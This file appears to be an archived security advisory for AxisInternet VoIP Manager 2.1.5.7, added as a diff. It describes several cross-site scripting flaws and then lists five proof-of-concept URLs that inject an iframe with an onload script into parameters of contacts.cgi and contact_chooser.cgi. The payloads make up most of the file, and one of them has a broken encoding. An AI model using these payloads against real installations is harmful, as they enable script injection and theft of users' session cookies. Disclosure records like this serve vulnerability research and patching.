@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/55589/info
+
+AxisInternet VoIP Manager is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+AxisInternet VoIP Manager 2.1.5.7 is vulnerable; other versions may also be affected. 
+
+https://www.example.com/asterisk/contacts.cgi?usr=demo-100&type=1&type_selector=2&lastname=&lastname_match=1&firstname=&firstname_match=1&department=%22%3 %3Ciframe%20src=a%20onload=alert%28%22HI%22%29%20%3C&department_match=1&action=Select
+
+https://www.example.com/asterisk/contacts.cgi?usr=demo-100&type=1&type_selector=2&lastname=&lastname_match=1&firstname=%22%3E%3Ciframe%20src=a%20onload=alert%28%22HI%22%29%20%3C&firstname_match=1&department=&department_match=1&action=Select
+
+https://www.example.com/asterisk/contacts.cgi?usr=demo-100&type=1&type_selector=2&;lastname=%22%3E%3Ciframe%20src=a%20onload=alert%28%22HI%22%29%20%3C&lastname_match=1&firstname=&firstname_match=1&department=&department_match=1&action=Select
+
+https://www.example.com/asterisk/contact_chooser.cgi?contact=%22%3E%3Ciframe%20src=a%20onload=alert%28%22HI%22%29%20%3C
+
+https://www.example.com/asterisk/contacts.cgi?type=2&usr=demo-100&managed_usr=%22%3E%3Ciframe%20src=a%20onload=alert%28%22HI%22%29%20%3C&type_selector=2&lastname=&lastname_match=1&firstname=&firstname_match=1&department=&department_match=1&action=Select+ 
